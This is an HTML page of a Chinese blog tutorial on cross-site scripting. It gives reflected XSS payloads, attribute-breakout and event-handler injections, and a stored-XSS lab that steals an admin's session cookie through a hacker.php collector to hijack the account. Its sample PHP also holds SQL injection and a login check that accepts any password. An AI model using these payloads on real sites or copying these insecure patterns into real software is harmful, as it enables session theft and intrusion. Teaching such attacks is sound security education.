@@ -1,0 +1,1028 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>网络安全之XSS（一）--攻击篇 - 微端生活</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+  
+  <meta name="description" content="什么是XSS xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而">
+  <meta name="author" content="yuzhanwaiting">
+  <meta itemprop="name" content="网络安全之XSS（一）--攻击篇 - 微端生活">
+  <meta itemprop="description" content="什么是XSS xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而">
+  <meta itemprop="image" content="http://www.yuzhan.me/img/author.jpg">
+  
+  
+  <meta name="twitter:description" content="">
+  
+  <link rel="shortcut icon" href="http://www.yuzhan.me/img/favicon.ico"/>
+  <link rel="apple-touch-icon" href="http://www.yuzhan.me/apple-touch-icon.png" />
+  <link rel="apple-touch-icon-precomposed" href="http://www.yuzhan.me/apple-touch-icon.png" />
+  <link rel="stylesheet" href="http://www.yuzhan.me/highlight/styles/github.css">
+  <script src="http://www.yuzhan.me/highlight/highlight.pack.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <link rel="stylesheet" href="http://www.yuzhan.me/font/hack/css/hack.min.css">
+  <link rel="stylesheet" href="http://www.yuzhan.me/css/style.css">
+</head>
+
+<body>
+  <header>
+    <div>
+  
+  <div id="imglogo">
+    <a href="http://www.yuzhan.me/"><img src="http://www.yuzhan.me/img/author.jpg" alt="微端生活" title="微端生活"/></a>
+  </div>
+  
+  <div id="textlogo">
+    <h1 class="site-name"><a href="http://www.yuzhan.me/" title="微端生活">微端生活</a></h1>
+    <h2 class="blog-motto">程序生活和小说创作者</h2>
+  </div>
+  <div class="navbar"><a class="navbutton navmobile" href="#" title="menu"></a></div>
+  <nav class="animated">
+    <ul>
+      
+      <li><a href="/">首页</a></li>
+      
+      <li><a href="/about">关于</a></li>
+      
+    </ul>
+  </nav>
+</div>
+
+  </header>
+  <div id="container">
+    <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody">
+    <header class="article-info clearfix">
+  <h1 itemprop="name">
+      <a href="http://www.yuzhan.me/post/2016-10-25-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B9%8BXSS%EF%BC%88%E4%B8%80%EF%BC%89--%E6%94%BB%E5%87%BB%E7%AF%87/" title="网络安全之XSS（一）--攻击篇" itemprop="url">网络安全之XSS（一）--攻击篇</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://www.yuzhan.me/" title="yuzhanwaiting">yuzhanwaiting</a>
+    
+  </p>
+  <p class="article-time">
+    <time datetime="2016-10-24 00:00:00 &#43;0000 UTC" itemprop="datePublished">2016年10月24日</time>
+  </p>
+</header>
+
+	<div class="article-content">
+    
+		<div class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#什么是xss">什么是XSS</a>
+<ul>
+<li><a href="#攻击类型分类">攻击类型分类</a></li>
+</ul></li>
+<li><a href="#反射型xss简单举例">反射型XSS简单举例</a>
+<ul>
+<li><a href="#搭建一个简单的页面">搭建一个简单的页面</a></li>
+<li><a href="#标准输入-和xss攻击">标准输入，和XSS攻击</a></li>
+<li><a href="#xss利用输出的环境来构造代码">XSS利用输出的环境来构造代码</a></li>
+<li><a href="#不含标签的xss攻击">不含标签的XSS攻击</a></li>
+</ul></li>
+<li><a href="#存储型xss攻击举例">存储型XSS攻击举例</a>
+<ul>
+<li><a href="#session背景知识">session背景知识</a>
+<ul>
+<li><a href="#什么是session">什么是session</a></li>
+<li><a href="#session的工作原理">session的工作原理</a></li>
+</ul></li>
+<li><a href="#示例">示例</a>
+<ul>
+<li><a href="#创建表">创建表</a></li>
+<li><a href="#插入几行数据">插入几行数据</a></li>
+<li><a href="#创建如下几个文件">创建如下几个文件</a>
+<ul>
+<li><a href="#目录结构如下">目录结构如下：</a></li>
+<li><a href="#db-php">db.php</a></li>
+<li><a href="#login-php">login.php</a></li>
+<li><a href="#list-php">list.php</a></li>
+<li><a href="#change-php-xss攻击入口">change.php(XSS攻击入口)</a></li>
+<li><a href="#hacker-php">hacker.php</a></li>
+</ul></li>
+<li><a href="#演示">演示</a></li>
+<li><a href="#利用普通用户登陆系统">利用普通用户登陆系统</a></li>
+<li><a href="#输入xss攻击代码">输入XSS攻击代码</a></li>
+<li><a href="#等待用户上钩">等待用户上钩</a></li>
+<li><a href="#利用收集的信息操作">利用收集的信息操作</a></li>
+</ul></li>
+<li><a href="#总结">总结</a></li>
+</ul></li>
+<li><a href="#相关资料">相关资料</a>
+<ul>
+<li><a href="#xss相关资料">xss相关资料</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+		</div>
+    
+    
+
+<h2 id="什么是xss">什么是XSS</h2>
+
+<p>xss表示Cross Site Scripting(跨站脚本攻击)，它与SQL注入攻击类似，SQL注入攻击中以SQL语句作为用户输入，从而达到查询/修改/删除数据的目的，而在xss攻击中，通过插入恶意脚本，实现对用户游览器的控制。</p>
+
+<h3 id="攻击类型分类">攻击类型分类</h3>
+
+<ol>
+<li><p>（反射型）非持久型攻击</p>
+
+<blockquote>
+<p>顾名思义，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。</p>
+</blockquote></li>
+
+<li><p>（存储型）持久型攻击</p>
+
+<blockquote>
+<p>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。下面来看一个利用持久型xss攻击获取session id的实例。</p>
+</blockquote></li>
+</ol>
+
+<h2 id="反射型xss简单举例">反射型XSS简单举例</h2>
+
+<p><strong>由于谷歌内核浏览器有部分xss防御功能，因此以下的操作均使用ie浏览器进行</strong></p>
+
+<h3 id="搭建一个简单的页面">搭建一个简单的页面</h3>
+
+<pre><code>&lt;html&gt; 
+    &lt;head&gt; 
+        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
+        &lt;title&gt;XSS测试&lt;/title&gt; 
+    &lt;/head&gt; 
+    &lt;body&gt; 
+        &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; 
+            &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt; 
+            &lt;input type=&quot;submit&quot;&gt; 
+        &lt;/form&gt; 
+        &lt;a href=&quot;http://www.yuzhan.me&quot; target=&quot;_blank&quot;&gt;Click to view a new site&lt;/a&gt;
+        &lt;hr/&gt; 
+        &lt;?php 
+            $xss = $_GET['xss_input'];  
+            echo '你输入的字符为&lt;br&gt;'.$xss;  
+        ?&gt; 
+    &lt;/body&gt; 
+&lt;/html&gt; 
+</code></pre>
+
+<p>界面效果：<br />
+<img src="/public/img/images/2016/10/xss_page.png" alt="页面初步效果" /></p>
+
+<h3 id="标准输入-和xss攻击">标准输入，和XSS攻击</h3>
+
+<p>我们试着输入&rdquo;标准输入测试&rdquo;，得到的结果为：<br />
+<img src="/public/img/images/2016/10/xss_page.png" alt="标准输入测试" /></p>
+
+<p>输入的字符被显示出来。假设输入如下代码：<br />
+<code>&lt;script&gt;alert('xss攻击测试')&lt;/script&gt;</code></p>
+
+<p>此时显示的结果为：<br />
+<img src="/public/img/images/2016/10/xss_attack_test1.png" alt="xss攻击测试" /></p>
+
+<p>查看源码，发现原来输入数据完全嵌入页面中
+<img src="/public/img/images/2016/10/xss_attack_test1_source.png" alt="xss攻击测试源码" /></p>
+
+<p>如上图所表示，说明该页面存在XSS漏洞</p>
+
+<p>如果只是简单的<code>alert</code>，可能觉得会没有什么大碍。但是改变代码，输入以下：</p>
+
+<pre><code> &lt;script&gt;
+     window.onload = function() {
+        document.getElementsByTagName(&quot;a&quot;)[0].href=&quot;http://www.baidu.com/&quot;;
+     }
+ &lt;/script&gt;
+</code></pre>
+
+<p>点击页面链接，发现连接地址已经改变，跳转到<code>www.baidu.com</code>了。</p>
+
+<h3 id="xss利用输出的环境来构造代码">XSS利用输出的环境来构造代码</h3>
+
+<pre><code>&lt;html&gt; 
+    &lt;head&gt; 
+        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
+        &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt; 
+    &lt;/head&gt; 
+    &lt;body&gt; 
+        &lt;center&gt; 
+        &lt;h2&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h2&gt; 
+            &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; 
+                &lt;h4&gt;请输入你想显现的字符串&lt;/h4&gt; 
+                &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot;&gt;&lt;br&gt; 
+                &lt;input type=&quot;submit&quot;&gt; 
+            &lt;/form&gt; 
+        &lt;hr&gt; 
+        &lt;?php 
+            $xss = $_GET['xss_input_value'];  
+            if(isset($xss)){  
+                echo '&lt;input type=&quot;text&quot; value=&quot;'.$xss.'&quot;&gt;';  
+            }else{  
+                echo '&lt;input type=&quot;type&quot;&gt;';  
+            }  
+        ?&gt; 
+        &lt;/center&gt; 
+    &lt;/body&gt; 
+&lt;/html&gt; 
+</code></pre>
+
+<p>继续输入上述代码：<br />
+ <code>&lt;script&gt;alert('xss攻击测试')&lt;/script&gt;</code></p>
+
+<p>结果并不成功，没有弹出<code>xss攻击测试</code>，取而代之，要测试的内容，直接显示在<code>input</code>输入框中。<br />
+ <img src="/public/img/images/2016/10/xss_attack_test2.png" alt="根据环境构造xss测试一" /></p>
+
+<p>于是查看源码：
+ <img src="/public/img/images/2016/10/xss_attack_test2_source.png" alt="根据环境构造xss测试一源码" /></p>
+
+<p>从源码上可以分析,我们想要显示的内容，包含在<code>value</code>中，因此不能弹出 。</p>
+
+<p>找到原因就能构造新的攻击方式：</p>
+
+<p>尝试输入以下代码：
+ <code>&quot;&gt;&lt;script&gt;alert('xss攻击测试')&lt;/script&gt;</code></p>
+
+<p>结果成功，界面弹出提示：
+ <img src="/public/img/images/2016/10/xss_attack_test3.png" alt="根据环境构造xss测试二" /></p>
+
+<p>查看源码，发现上述代码的含义：
+ <img src="/public/img/images/2016/10/xss_attack_test3_source.png" alt="根据环境构造xss测试二源码" /></p>
+
+<p>分析代码含义：</p>
+
+<blockquote>
+<p>利用html特性，使用<code>&quot;&gt;</code>结束<code>value</code>，然后再<code>&lt;script&gt;alert('xss攻击测试')&lt;/script&gt;</code></p>
+</blockquote>
+
+<h3 id="不含标签的xss攻击">不含标签的XSS攻击</h3>
+
+<p>再拿刚才的页面做个测试,尝试输入以下代码
+<code>&quot; onclick=&quot;alert('xss攻击')</code></p>
+
+<p><img src="/public/img/images/2016/10/xss_attack_test4_0.png" alt="根据环境构造xss测试三" /></p>
+
+<p>页面上什么都没有，点击输出框，弹出<code>xss攻击</code>
+<img src="/public/img/images/2016/10/xss_attack_test4.png" alt="根据环境构造xss测试三" /></p>
+
+<p>查看源码，发觉输出<code>input</code>框已经改变
+<img src="/public/img/images/2016/10/xss_attack_test4_source.png" alt="根据环境构造xss测试三源码" /></p>
+
+<h2 id="存储型xss攻击举例">存储型XSS攻击举例</h2>
+
+<h3 id="session背景知识">session背景知识</h3>
+
+<h4 id="什么是session">什么是session</h4>
+
+<blockquote>
+<p>Session:在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。</p>
+</blockquote>
+
+<h4 id="session的工作原理">session的工作原理</h4>
+
+<blockquote>
+<ol>
+<li>当一个session第一次被启用时，一个唯一的标识被存储于本地的cookie中。</li>
+<li>首先使用session_start()函数，PHP从session仓库中加载已经存储的session变量。</li>
+<li>当执行PHP脚本时，通过使用session_register()函数注册session变量。</li>
+<li>当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.save_path指定，下次浏览网页时可以加载使用。</li>
+</ol>
+</blockquote>
+
+<h3 id="示例">示例</h3>
+
+<h4 id="创建表">创建表</h4>
+
+<pre><code>CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
+  `username` varchar(10) NOT NULL COMMENT '用户名',
+  `password` char(32) NOT NULL COMMENT '密码',
+  `nickname` varchar(255) NOT NULL COMMENT '昵称',
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;
+</code></pre>
+
+<h4 id="插入几行数据">插入几行数据</h4>
+
+<pre><code>INSERT INTO `users` VALUES ('1', 'admin', 'e10adc3949ba59abbe56e057f20f883e', 'haha');
+INSERT INTO `users` VALUES ('2', 'waiting', 'e10adc3949ba59abbe56e057f20f883e', 'kk');
+INSERT INTO `users` VALUES ('3', 'luna', 'e10adc3949ba59abbe56e057f20f883e', 'lulu');
+</code></pre>
+
+<h4 id="创建如下几个文件">创建如下几个文件</h4>
+
+<h5 id="目录结构如下">目录结构如下：</h5>
+
+<p><img src="/public/img/images/2016/10/xss_attack_test5_filetree.png" alt="存储型XSS攻击测试文件目录结构" /></p>
+
+<table>
+<thead>
+<tr>
+<th>文件名</th>
+<th>作用</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>login.php</td>
+<td>用户系统登陆文件</td>
+</tr>
+
+<tr>
+<td>list.php</td>
+<td>用户列表</td>
+</tr>
+
+<tr>
+<td>change.php</td>
+<td>修改昵称，xss攻击入口</td>
+</tr>
+
+<tr>
+<td>db.php</td>
+<td>数据库实用公共类</td>
+</tr>
+
+<tr>
+<td>hacker.php</td>
+<td>xss攻击接收文件，用于收集客户session</td>
+</tr>
+
+<tr>
+<td>cookie.txt</td>
+<td>xss攻击收集信息保存目标地址</td>
+</tr>
+</tbody>
+</table>
+
+<h5 id="db-php">db.php</h5>
+
+<pre><code>&lt;?php
+class Db
+{
+
+    protected $db;
+
+    public function __construct($config)
+    {
+
+        $this-&gt;db = new mysqli($config['host'],$config['username'],$config['password'],$config['dbname']);
+
+        if ($this-&gt;db-&gt;connect_error) 
+            throw new Exception(&quot;数据库连接错误&quot;);
+        
+
+        if (!$this-&gt;db-&gt;set_charset(&quot;utf8&quot;))
+            throw new Exception(&quot;设置字符集错误&quot;);
+            
+    }   
+
+    public function one($sql)
+    {
+        $res =  $this-&gt;query($sql);
+        return $res-&gt;fetch_row();
+    }
+
+    public function all($sql)
+    {
+        $res =  $this-&gt;query($sql);
+        $data = [];
+
+        while ($row = $res-&gt;fetch_assoc()) {
+            array_push($data, $row);
+        }
+
+        return $data;
+    }
+
+    public function query($sql)
+    {
+        return $this-&gt;db-&gt;query($sql);
+    }
+
+
+    public function __destroy()
+    {
+        $this-&gt;db-&gt;close();
+    }
+}
+
+
+$config = [
+    'host' =&gt; 'localhost',
+    'username' =&gt; 'root',
+    'password' =&gt; 'root',
+    'dbname' =&gt; 'test',
+    'port' =&gt; '3306' 
+];
+
+$db = new Db($config);
+
+</code></pre>
+
+<h5 id="login-php">login.php</h5>
+
+<pre><code>&lt;?php
+
+if (isset($_POST['submit'])) {
+
+    require_once('db.php');
+
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+
+
+    $sql = &quot;select `password` from `users` where `username` = '{$username}'&quot;;
+
+    $res = $db-&gt;one($sql);
+
+    $dbpassword = $res[0];
+
+    if ($dbpassword = md5($password)) {
+        session_start();
+        $_SESSION['username'] = $username;
+        header(&quot;location:list.php&quot;);
+    } else {
+        echo &quot;密码错误&quot;;
+    }
+}
+
+
+
+
+
+?&gt;
+&lt;html&gt; 
+    &lt;head&gt; 
+        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
+        &lt;title&gt;持久性XSS攻击测试--用户登录&lt;/title&gt; 
+    &lt;/head&gt; 
+    &lt;body&gt; 
+        &lt;center&gt; 
+        &lt;h2&gt;用户登录&lt;/h2&gt; 
+            &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; 
+                &lt;h4&gt;请输入用户名密码登陆&lt;/h4&gt; 
+                &lt;label&gt;用户名&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br/&gt; 
+                &lt;label&gt;密码&lt;/label&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br/&gt; 
+                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; 
+            &lt;/form&gt; 
+        &lt;hr&gt; 
+        &lt;/center&gt; 
+    &lt;/body&gt; 
+&lt;/html&gt; 
+</code></pre>
+
+<h5 id="list-php">list.php</h5>
+
+<pre><code>&lt;?php
+session_start();
+
+
+if (!$username = $_SESSION['username']) {
+    header(&quot;location:login.php&quot;);
+} 
+
+require_once('db.php');
+
+$sql = &quot;select * from users&quot;;
+
+$res = $db-&gt;all($sql);
+
+?&gt;
+&lt;html&gt; 
+    &lt;head&gt; 
+        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
+        &lt;title&gt;持久性XSS攻击测试--用户信息列表&lt;/title&gt; 
+    &lt;/head&gt; 
+    &lt;body&gt; 
+        &lt;center&gt; 
+        &lt;h2&gt;用户信息列表&lt;/h2&gt;&lt;a href=&quot;change.php&quot;&gt;修改昵称&lt;/a&gt; 
+            &lt;table border=&quot;1&quot; cellspacing=&quot;1&quot;&gt;
+                &lt;tr&gt;
+                    &lt;th&gt;id&lt;/th&gt;
+                    &lt;th&gt;用户名&lt;/th&gt;
+                    &lt;th&gt;昵称&lt;/th&gt;
+                &lt;/tr&gt;
+                &lt;?php
+                    foreach ($res as $value) {
+                        printf(&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;/tr&gt;&quot;, $value['id'], $value['username'], $value['nickname']);
+                    }
+                ?&gt;
+            &lt;/table&gt;
+        &lt;/center&gt; 
+    &lt;/body&gt; 
+&lt;/html&gt; 
+</code></pre>
+
+<h5 id="change-php-xss攻击入口">change.php(XSS攻击入口)</h5>
+
+<pre><code>&lt;?php
+session_start();
+
+require_once('db.php');
+
+if (!$username = $_SESSION['username']) {
+    header(&quot;location:login.php&quot;);
+} else {
+    if (isset($_POST['submit'])) {
+
+        $nickname = $_POST[&quot;nickname&quot;];
+
+        $sql = &quot;update users set nickname='{$nickname}' where username='{$username}'&quot;;
+
+        echo $sql;
+        
+        $res = $db-&gt;query($sql);
+
+        echo &quot;更新成功&quot;;
+    }
+}
+
+?&gt;
+
+&lt;html&gt; 
+    &lt;head&gt; 
+        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
+        &lt;title&gt;持久性XSS攻击测试--用户登录&lt;/title&gt; 
+    &lt;/head&gt; 
+    &lt;body&gt; 
+        &lt;center&gt; 
+        &lt;h2&gt;用户登录&lt;/h2&gt; 
+            &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; 
+                &lt;h4&gt;请输入新昵称&lt;/h4&gt; 
+                &lt;label&gt;新昵称&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;nickname&quot;&gt;&lt;br/&gt; 
+                &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; 
+            &lt;/form&gt; 
+        &lt;hr&gt; 
+        &lt;/center&gt; 
+    &lt;/body&gt; 
+&lt;/html&gt; 
+</code></pre>
+
+<h5 id="hacker-php">hacker.php</h5>
+
+<pre><code>&lt;?php
+$cookie = $_GET['cookie'];
+
+file_put_contents(&quot;cookie.txt&quot;, $cookie);
+
+?&gt;
+</code></pre>
+
+<h4 id="演示">演示</h4>
+
+<h4 id="利用普通用户登陆系统">利用普通用户登陆系统</h4>
+
+<p>此处，使用<code>luna</code>,密码<code>123456</code>。这里的用户是任意一个普通用户的。
+<img src="/public/img/images/2016/10/xss_attack_test5_login.png" alt="存储型XSS攻击测试文件目录结构" /></p>
+
+<h4 id="输入xss攻击代码">输入XSS攻击代码</h4>
+
+<p>进入修改昵称界面，输入<code>XSS</code>攻击代码。此处输入的XSS代码，是根据以上文件的漏洞而写的。实际应用中，可能需要各种手段去处理，但是不再本文范围之内，就不多讨论了。
+<code>&lt;script&gt;window.onload = function(){ window.location.href = &quot;hacker.php?cookie=&quot; + document.cookie; }&lt;/script&gt;</code></p>
+
+<p>点击提交，发觉数据库内容已经更改，xss攻击已经存储进数据库
+<img src="/public/img/images/2016/10/xss_attack_test5_msyqldata.png" alt="存储型XSS攻击存储数据" /></p>
+
+<h4 id="等待用户上钩">等待用户上钩</h4>
+
+<p>当用户进入<code>list.php</code>，会自动跳转到预先写好的<strong>收集</strong>界面。<br />
+这里，如果是<code>admin</code>用户来使用系统，就可以获取其重要信息。
+<img src="/public/img/images/2016/10/xss_attack_test5_adminlogin.png" alt="存储型XSS攻击管理员登陆" /></p>
+
+<p>登陆系统，直接跳转至收集页面
+<img src="/public/img/images/2016/10/xss_attack_test5_admin_redirection.png" alt="存储型XSS攻击管理员登陆" /></p>
+
+<h4 id="利用收集的信息操作">利用收集的信息操作</h4>
+
+<p>查看<code>cookie.txt</code>文件，发觉已经收集到相关信息:<br />
+<code>PHPSESSID=ruolpn1lt58j6es7smrnbeu217</code></p>
+
+<p>于是，修改<code>cookie</code>,我们目前就是<code>admin</code>的身份。
+<img src="/public/img/images/2016/10/xss_attack_test5_changecookie.png" alt="存储型XSS攻击修改cookie" /></p>
+
+<p>尝试修改自己的昵称
+<img src="/public/img/images/2016/10/xss_attack_test5_luna_xss.png" alt="存储型XSS攻击修改管理员昵称" /></p>
+
+<p>结果很不客气的修改了管理员的昵称
+<img src="/public/img/images/2016/10/xss_attack_test5_luna_xss_result.png" alt="存储型XSS攻击修改管理员昵称结果" /></p>
+
+<h3 id="总结">总结</h3>
+
+<p>这一小节，主要举例存储型XSS攻击。这一类攻击，如我们演示的，可能会对系统造成很大的灾难。下一篇，就介绍一下如何防止XSS攻击</p>
+
+<h2 id="相关资料">相关资料</h2>
+
+<h3 id="xss相关资料">xss相关资料</h3>
+
+<p><a href="https://github.com/jackmasa/XSS.png.git">xss相关攻击代码整理</a></p>
+
+	</div>
+  <footer class="article-footer clearfix">
+  
+
+<div class="article-tags">
+  <span></span>
+  
+  <a href="http://www.yuzhan.me/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">网络安全</a>
+  
+  <a href="http://www.yuzhan.me/tags/xss">XSS</a>
+  
+</div>
+
+
+
+
+
+<div class="article-categories">
+  <span></span>
+  
+  <a class="article-category-link" href="http://www.yuzhan.me/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">网络安全</a>
+  
+</div>
+
+
+
+  <div class="article-share" id="share">
+    <div data-url="http://www.yuzhan.me/post/2016-10-25-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B9%8BXSS%EF%BC%88%E4%B8%80%EF%BC%89--%E6%94%BB%E5%87%BB%E7%AF%87/" data-title="网络安全之XSS（一）--攻击篇" data-tsina="" class="share clearfix">
+    </div>
+  </div>
+</footer>
+
+	</article>
+  
+
+
+
+</div>
+
+    <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+  
+
+<div class="categorieslist">
+  <p class="asidetitle">分类</p>
+  <ul>
+    
+    <li><a href="http://www.yuzhan.me/categories/js%e5%89%8d%e7%ab%af" title="js前端">js前端<sup>3</sup></a></li>
+    
+    <li><a href="http://www.yuzhan.me/categories/linux" title="linux">linux<sup>4</sup></a></li>
+    
+    <li><a href="http://www.yuzhan.me/categories/php" title="php">php<sup>14</sup></a></li>
+    
+    <li><a href="http://www.yuzhan.me/categories/python" title="python">python<sup>3</sup></a></li>
+    
+    <li><a href="http://www.yuzhan.me/categories/vagrant" title="vagrant">vagrant<sup>1</sup></a></li>
+    
+    <li><a href="http://www.yuzhan.me/categories/%e5%85%b6%e4%bb%96" title="其他">其他<sup>1</sup></a></li>
+    
+    <li><a href="http://www.yuzhan.me/categories/%e6%95%b0%e6%8d%ae%e5%ba%93" title="数据库">数据库<sup>1</sup></a></li>
+    
+    <li><a href="http://www.yuzhan.me/categories/%e6%97%a0%e9%99%90%e7%ba%a7%e5%88%86%e7%b1%bb" title="无限级分类">无限级分类<sup>3</sup></a></li>
+    
+    <li><a href="http://www.yuzhan.me/categories/%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8" title="网络安全">网络安全<sup>1</sup></a></li>
+    
+  </ul>
+</div>
+
+
+
+  
+
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+      
+			<li><a href="http://www.yuzhan.me/tags/composer" title="composer">composer<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/php" title="php">php<sup>2</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/sphinx" title="sphinx">sphinx<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/tlpi" title="tlpi">tlpi<sup>4</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/vagrant" title="vagrant">vagrant<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/xss" title="xss">xss<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0" title="学习笔记">学习笔记<sup>7</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e5%be%ae%e4%bf%a1" title="微信">微信<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e5%bf%83%e5%be%97" title="心得">心得<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e6%95%b0%e7%bb%84" title="数组">数组<sup>3</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e6%96%87%e4%bb%b6io" title="文件io">文件io<sup>4</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6" title="文件描述符">文件描述符<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e6%97%a0%e9%99%90%e7%ba%a7%e5%88%86%e7%b1%bb" title="无限级分类">无限级分类<sup>5</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e6%a1%86%e6%9e%b6%e8%ae%be%e8%ae%a1" title="框架设计">框架设计<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e7%94%a8%e6%88%b7%e5%8c%b9%e9%85%8d" title="用户匹配">用户匹配<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8" title="网络安全">网络安全<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e8%ae%be%e8%ae%a1%e6%a8%a1%e5%bc%8f" title="设计模式">设计模式<sup>1</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e9%80%92%e5%bd%92" title="递归">递归<sup>3</sup></a></li>
+      
+			<li><a href="http://www.yuzhan.me/tags/%e9%9d%9e%e9%80%92%e5%bd%92" title="非递归">非递归<sup>1</sup></a></li>
+      
+		</ul>
+</div>
+
+
+
+  
+  <div class="archiveslist">
+    <p class="asidetitle">归档</p>
+    <ul class="archive-list">
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2016-10">2016年10月</a><span class="archive-list-count">1</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2016-03">2016年03月</a><span class="archive-list-count">1</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2015-12">2015年12月</a><span class="archive-list-count">1</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2015-11">2015年11月</a><span class="archive-list-count">1</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2015-09">2015年09月</a><span class="archive-list-count">4</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2015-08">2015年08月</a><span class="archive-list-count">2</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2015-01">2015年01月</a><span class="archive-list-count">1</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2014-03">2014年03月</a><span class="archive-list-count">2</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2014-02">2014年02月</a><span class="archive-list-count">1</span>
+      </li>
+      
+      
+      <li class="archive-list-item">
+        <a class="archive-list-link" href="http://www.yuzhan.me/post/#2014-01">2014年01月</a><span class="archive-list-count">15</span>
+      </li>
+      
+    </ul>
+
+  </div>
+
+
+  
+
+<div class="tagcloudlist">
+  <p class="asidetitle">标签云</p>
+  <div class="tagcloudlist clearfix">
+    
